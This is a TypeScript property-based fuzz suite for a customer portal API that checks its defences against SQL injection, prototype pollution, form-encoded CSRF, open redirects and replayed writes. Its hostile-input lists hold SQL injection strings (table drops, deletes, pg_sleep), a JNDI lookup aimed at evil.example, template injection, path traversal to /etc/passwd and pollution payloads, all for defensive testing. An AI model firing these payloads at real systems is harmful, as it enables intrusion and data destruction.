// Feature: customer-experience-portal, task 16.6: adversarial input fuzz suite
/**
 * TASK 16.6 — adversarial input across every portal endpoint.
 * Validates Requirements 2.7, 26.4, 26.5, 26.6.
 *
 * Four obligations, from the task:
 *   1. Fuzz every endpoint with SQL metacharacters and `__proto__`/`constructor`
 *      keys in every string field; only 4xx, never 5xx, never a stack trace.
 *   2. A form-encoded body to any portal write returns 400.
 *   3. A `?return=https://evil.example` value is ignored.
 *   4. (26.4) A malformed payload, an unauthenticated request, a duplicated request
 *      and a replayed request are all covered.
 *
 * ── WHY 2xx IS PERMITTED AND 5xx IS NOT ─────────────────────────────────────
 * A hostile STRING is not a malformed request. `firstName: "'; DROP TABLE"` is a
 * validly shaped name, and a parameterised query stores it as text — so a 200 is the
 * correct answer and asserting 4xx would demand the service reject legitimate
 * apostrophes. What must never happen is a 5xx: that means the string reached
 * something that tried to interpret it. So the assertion is `< 500`, plus the
 * internals scan, plus the prototype checks below.
 *
 * ── WHY THE POLLUTION PAYLOADS ARE RAW JSON TEXT ────────────────────────────
 * `JSON.stringify({ __proto__: { x: 1 } })` is `"{}"`. In an object literal
 * `__proto__` sets the prototype instead of creating an own property, so a test
 * written with object literals sends NOTHING and passes while testing nothing. Every
 * pollution payload here is therefore a JSON string written by hand.
 *
 * SAFETY: in-memory only. No network, no database, no production.
 */
import { afterEach, describe, expect, it } from "vitest";
import fc from "fast-check";
import type { FastifyInstance } from "fastify";
import {
  A,
  bearer,
  bodyFor,
  BODY_METHODS,
  buildHarness,
  concretise,
  idempotencyKey,
  portalRoutes,
  type HarnessRoute,
} from "../testing/portalHarness.js";

let app: FastifyInstance | null = null;
afterEach(async () => {
  await app?.close();
  app = null;
});

/** Values that would break a concatenated query, or be read as markup or a path. */
const HOSTILE_STRINGS: readonly string[] = [
  "'; DROP TABLE customers; --",
  "' OR '1'='1",
  '" OR ""="',
  "'; SELECT pg_sleep(10); --",
  "1; UPDATE ledger_entries SET points = 999999",
  "\\'; DELETE FROM referrals WHERE 1=1; --",
  "%27%20OR%201%3D1",
  "${jndi:ldap://evil.example/x}",
  "{{constructor.constructor('return process')()}}",
  "../../../../etc/passwd",
  "\u0000truncated",
  "<script>alert(1)</script>",
  "-1e999",
  "9".repeat(5000),
];

/** Prototype-pollution payloads, as RAW JSON so the keys actually survive. */
const POLLUTION_BODIES: readonly string[] = [
  '{"__proto__":{"polluted":"yes"}}',
  '{"__proto__":{"isAdmin":true}}',
  '{"constructor":{"prototype":{"polluted":"yes"}}}',
  '{"__proto__":[]}',
  '{"a":{"__proto__":{"polluted":"yes"}}}',
  '{"month":6,"day":10,"__proto__":{"polluted":"yes"}}',
  '{"declared":{"scent_family":["oud"],"__proto__":{"polluted":"yes"}}}',
  '{"on":true,"constructor":{"prototype":{"polluted":"yes"}}}',
  '{"__proto__":{"customerId":"00000000-0000-0000-0000-000000000000"}}',
  '{"toString":{"polluted":"yes"}}',
  '{"prototype":{"polluted":"yes"}}',
];

/** Shapes that reveal the service's internals. Kept in step with 16.5's scanner. */
const INTERNALS: readonly RegExp[] = [
  /\bselect\b[\s\S]{0,120}?\bfrom\b/i,
  /\binsert\s+into\b/i,
  /\bupdate\b[\s\S]{0,60}?\bset\b/i,
  /\bdelete\s+from\b/i,
  /\brelation\s+\\?"/i,
  /\bpg_[a-z_]+/i,
  /\bconstraint\s+\\?"/i,
  /\bsyntax\s+error\b/i,
  /\bunterminated\b/i,
  /postgres(?:ql)?:\/\//i,
  /\bat\s+[^\n]{0,80}\.(?:ts|js|mjs|cjs):\d+/i,
  /node_modules/,
  /(?:^|[\s"'(])\/(?:app|Users|home|usr|var|opt)\//,
  /\bE(?:CONNREFUSED|CONNRESET|TIMEDOUT|NOTFOUND)\b/,
];

function internalsIn(body: string): string[] {
  return INTERNALS.filter((p) => p.test(body)).map((p) => `${String(p)} matched`);
}

/** Replaces every string leaf in a valid body with a hostile value. */
function poison(value: unknown, hostile: string): unknown {
  if (typeof value === "string") return hostile;
  if (Array.isArray(value)) return value.map((v) => poison(v, hostile));
  if (value !== null && typeof value === "object") {
    return Object.fromEntries(
      Object.entries(value).map(([k, v]) => [k, poison(v, hostile)]),
    );
  }
  return value;
}

/** The prototype keys a payload might try to add, checked after every request. */
function prototypeIsClean(): string[] {
  const proto = Object.prototype as unknown as Record<string, unknown>;
  const dirty: string[] = [];
  for (const key of ["polluted", "isAdmin", "customerId"]) {
    if (key in proto) dirty.push(`Object.prototype.${key} was set`);
    if ((({} as Record<string, unknown>)[key] ?? undefined) !== undefined) {
      dirty.push(`a fresh object inherited ${key}`);
    }
  }
  // `toString` must still be the function it was, not an object from a payload.
  if (typeof ({}).toString !== "function") dirty.push("Object.prototype.toString was replaced");
  return dirty;
}

describe("adversarial input", () => {
  it("Property: hostile strings in every field never produce a 5xx or leak internals", async () => {
    const harness = await buildHarness();
    app = harness.app;
    const targets = portalRoutes(harness.routes);

    await fc.assert(
      fc.asyncProperty(
        fc.nat({ max: targets.length - 1 }),
        fc.constantFrom(...HOSTILE_STRINGS),
        fc.boolean(),
        async (routeIndex, hostile, poisonThePath) => {
          const route = targets[routeIndex] as HarnessRoute;
          const hasBody = BODY_METHODS.has(route.method);
          // Hostile input reaches the PATH and the QUERY STRING too, not only the
          // body — a path parameter is the likeliest thing to be concatenated.
          const base = concretise(route.url, A);
          const url = poisonThePath
            ? `${base.replace(/[^/]+$/, encodeURIComponent(hostile))}?q=${encodeURIComponent(hostile)}`
            : `${base}?q=${encodeURIComponent(hostile)}`;

          const res = await harness.app.inject({
            method: route.method as "GET",
            url,
            headers: {
              ...bearer(A),
              ...(hasBody ? { "content-type": "application/json" } : {}),
              ...(hasBody ? { "idempotency-key": idempotencyKey() } : {}),
              // A header is an input channel as much as the body is.
              "x-forwarded-for": hostile.slice(0, 200),
            },
            ...(hasBody
              ? { payload: JSON.stringify(poison(bodyFor(route.url), hostile)) }
              : {}),
          });

          expect(
            res.statusCode,
            `${route.method} ${route.url} returned ${res.statusCode} for ${hostile.slice(0, 40)}`,
          ).toBeLessThan(500);
          expect(
            internalsIn(res.body),
            `${route.method} ${route.url} leaked internals: ${res.body.slice(0, 200)}`,
          ).toEqual([]);
        },
      ),
      { numRuns: 200 },
    );
  });

  it("Property: __proto__ and constructor keys never pollute the prototype", async () => {
    const harness = await buildHarness();
    app = harness.app;
    const writes = portalRoutes(harness.routes).filter((r) => BODY_METHODS.has(r.method));
    expect(writes.length, "no write routes found").toBeGreaterThan(0);

    await fc.assert(
      fc.asyncProperty(
        fc.nat({ max: writes.length - 1 }),
        fc.constantFrom(...POLLUTION_BODIES),
        async (routeIndex, payload) => {
          const route = writes[routeIndex] as HarnessRoute;
          const res = await harness.app.inject({
            method: route.method as "POST",
            url: concretise(route.url, A),
            headers: {
              ...bearer(A),
              "content-type": "application/json",
              "idempotency-key": idempotencyKey(),
            },
            payload,
          });
          expect(res.statusCode, `${route.method} ${route.url}`).toBeLessThan(500);
          expect(prototypeIsClean(), `${route.method} ${route.url} with ${payload}`).toEqual([]);
          expect(internalsIn(res.body), `${route.method} ${route.url}`).toEqual([]);
        },
      ),
      { numRuns: 200 },
    );
    // Belt and braces: still clean after the whole run.
    expect(prototypeIsClean()).toEqual([]);
  });

  it("is NON-VACUOUS: the pollution check can actually detect a polluted prototype", () => {
    // Without this, `prototypeIsClean()` returning [] would prove nothing.
    expect(prototypeIsClean()).toEqual([]);
    const proto = Object.prototype as unknown as Record<string, unknown>;
    try {
      Object.defineProperty(proto, "polluted", {
        value: "yes",
        configurable: true,
        enumerable: false,
      });
      expect(prototypeIsClean().length).toBeGreaterThan(0);
    } finally {
      delete proto.polluted;
    }
    expect(prototypeIsClean()).toEqual([]);
  });

  it("is NON-VACUOUS: the internals scanner catches a leaked SQL error", () => {
    expect(internalsIn('{"message":"syntax error at or near \\"DROP\\""}')).not.toEqual([]);
    expect(internalsIn('{"message":"SELECT id FROM customers WHERE 1=1"}')).not.toEqual([]);
    expect(internalsIn('{"error":"invalid_request","message":"The request could not be read."}')).toEqual(
      [],
    );
  });

  it("a form-encoded body to ANY portal write returns 400", async () => {
    // A cross-site `<form>` can only send form-encoded, multipart or text/plain, so
    // refusing form-encoded on every write is also the CSRF property.
    const harness = await buildHarness();
    app = harness.app;
    const writes = portalRoutes(harness.routes).filter((r) => BODY_METHODS.has(r.method));
    const failures: string[] = [];
    for (const route of writes) {
      const res = await harness.app.inject({
        method: route.method as "POST",
        url: concretise(route.url, A),
        headers: {
          ...bearer(A),
          "content-type": "application/x-www-form-urlencoded",
          "idempotency-key": idempotencyKey(),
        },
        payload: "month=6&day=10&on=true",
      });
      if (res.statusCode !== 400) {
        failures.push(`${route.method} ${route.url} returned ${res.statusCode}, not 400`);
      }
      const body = res.json() as { error?: unknown };
      if (body.error !== "invalid_request") {
        failures.push(`${route.method} ${route.url} error was ${String(body.error)}`);
      }
    }
    expect(failures, failures.join("\n")).toEqual([]);
  });

  it("a text/plain body cannot smuggle a parseable JSON payload", async () => {
    // The other half of the CSRF property: `<form enctype="text/plain">` can produce
    // a body that LOOKS like JSON. It must not be parsed as JSON.
    const harness = await buildHarness();
    app = harness.app;
    // A's seeded birthday is 6/10, so the smuggled value must be something else —
    // asserting on 6/10 would pass on the fixture and prove nothing.
    const res = await harness.app.inject({
      method: "PUT",
      url: "/v1/profile/birthday",
      headers: { ...bearer(A), "content-type": "text/plain", "idempotency-key": idempotencyKey() },
      payload: JSON.stringify({ month: 3, day: 15 }),
    });
    // Rejected as an absent body, not accepted as a birthday.
    expect(res.statusCode).toBe(400);
    expect(res.json()).toMatchObject({ error: "invalid_request" });
    // And nothing was stored: the smuggled date is not the stored one.
    const after = await harness.app.inject({
      method: "GET",
      url: "/v1/profile/birthday",
      headers: bearer(A),
    });
    expect(after.body, "a text/plain body was parsed as JSON").not.toContain('"month":3');
    expect(after.json()).toMatchObject({ birthday: { month: 6, day: 10 } });
  });

  it("a ?return= value is ignored on every portal route", async () => {
    // §5.3 / E.3: the re-authentication route is same-origin and a `return`
    // parameter is ignored. The service half of that is testable now: no portal
    // route may redirect, and no `return` value may change what comes back. The
    // client half belongs to the frontend re-authentication work.
    const harness = await buildHarness();
    app = harness.app;
    const evil = "https://evil.example/steal";
    const failures: string[] = [];

    for (const route of portalRoutes(harness.routes).filter((r) => r.method === "GET")) {
      const clean = await harness.app.inject({
        method: "GET",
        url: concretise(route.url, A),
        headers: bearer(A),
      });
      for (const param of ["return", "return_to", "returnTo", "redirect", "next"]) {
        const withParam = await harness.app.inject({
          method: "GET",
          url: `${concretise(route.url, A)}?${param}=${encodeURIComponent(evil)}`,
          headers: bearer(A),
        });
        if (withParam.statusCode >= 300 && withParam.statusCode < 400) {
          failures.push(`${route.url} redirected for ?${param}=`);
        }
        if (withParam.headers.location !== undefined) {
          failures.push(`${route.url} set Location for ?${param}=`);
        }
        if (withParam.body.includes("evil.example")) {
          failures.push(`${route.url} echoed the ?${param}= value`);
        }
        if (withParam.statusCode !== clean.statusCode) {
          failures.push(
            `${route.url} status changed with ?${param}= (${clean.statusCode} -> ${withParam.statusCode})`,
          );
        }
      }
    }
    expect(failures, failures.join("\n")).toEqual([]);
  });

  it("an unauthenticated hostile request changes nothing and reveals nothing (Req 26.4)", async () => {
    const harness = await buildHarness();
    app = harness.app;
    const before = harness.db.snapshot();

    for (const route of portalRoutes(harness.routes)) {
      const hasBody = BODY_METHODS.has(route.method);
      const res = await harness.app.inject({
        method: route.method as "GET",
        url: `${concretise(route.url, A)}?q=${encodeURIComponent("' OR '1'='1")}`,
        headers: {
          ...(hasBody ? { "content-type": "application/json" } : {}),
          ...(hasBody ? { "idempotency-key": idempotencyKey() } : {}),
        },
        // A PARSEABLE hostile body, so the request reaches the auth gate. An
        // unparseable one is refused earlier — see the next test.
        ...(hasBody ? { payload: JSON.stringify(poison(bodyFor(route.url), "' OR '1'='1")) } : {}),
      });
      expect(res.statusCode, `${route.method} ${route.url}`).toBe(401);
      expect(internalsIn(res.body), `${route.method} ${route.url}`).toEqual([]);
    }
    expect(prototypeIsClean()).toEqual([]);
    expect(harness.db.snapshot(), "stored data changed").toBe(before);
  });

  it("an unparseable payload is refused identically with and without credentials", async () => {
    // WHAT THIS DOCUMENTS. A `__proto__` or `constructor.prototype` body is rejected
    // by Fastify's JSON parser (`secure-json-parse`) BEFORE any handler or the auth
    // gate runs, so it answers 400 rather than 401 even unauthenticated. That is the
    // right order — the payload is refused before anything is done with it, and the
    // polluted object is never constructed.
    //
    // The property that matters is that it discloses nothing: the answer must be
    // byte-identical with and without credentials, so it cannot be used to probe
    // which routes exist or which credentials are valid.
    const harness = await buildHarness();
    app = harness.app;
    const writes = portalRoutes(harness.routes).filter((r) => BODY_METHODS.has(r.method));
    const failures: string[] = [];

    for (const route of writes) {
      for (const payload of ['{"__proto__":{"polluted":"yes"}}', '{"constructor":{"prototype":{"p":1}}}']) {
        const headers = {
          "content-type": "application/json",
          "idempotency-key": idempotencyKey(),
        };
        const authed = await harness.app.inject({
          method: route.method as "POST",
          url: concretise(route.url, A),
          headers: { ...headers, ...bearer(A) },
          payload,
        });
        const anonymous = await harness.app.inject({
          method: route.method as "POST",
          url: concretise(route.url, A),
          headers: { ...headers, "idempotency-key": idempotencyKey() },
          payload,
        });
        if (authed.statusCode !== 400 || anonymous.statusCode !== 400) {
          failures.push(
            `${route.method} ${route.url}: ${authed.statusCode}/${anonymous.statusCode}, expected 400/400`,
          );
        }
        if (authed.body !== anonymous.body) {
          failures.push(`${route.method} ${route.url}: authed and anonymous bodies differ`);
        }
      }
    }
    expect(failures, failures.join("\n")).toEqual([]);
    expect(prototypeIsClean()).toEqual([]);
  });

  it("a duplicated and a replayed write are both safe (Req 26.4)", async () => {
    const harness = await buildHarness();
    app = harness.app;
    const key = idempotencyKey();
    const send = async () =>
      harness.app.inject({
        method: "PUT",
        url: "/v1/profile/birthday",
        headers: { ...bearer(A), "idempotency-key": key },
        payload: { month: 6, day: 10 },
      });

    const first = await send();
    const duplicate = await send();
    expect(first.statusCode).toBeLessThan(500);
    // Same key, same request: the second must not be a fault, and must not double-apply.
    expect(duplicate.statusCode).toBeLessThan(500);
    expect(internalsIn(duplicate.body)).toEqual([]);

    // A REPLAY with the same key but a DIFFERENT body must not be served the
    // first response as though it were this one.
    const replay = await harness.app.inject({
      method: "PUT",
      url: "/v1/profile/birthday",
      headers: { ...bearer(A), "idempotency-key": key },
      payload: { month: 12, day: 25 },
    });
    expect(replay.statusCode).toBeLessThan(500);
    expect(internalsIn(replay.body)).toEqual([]);
  });
});
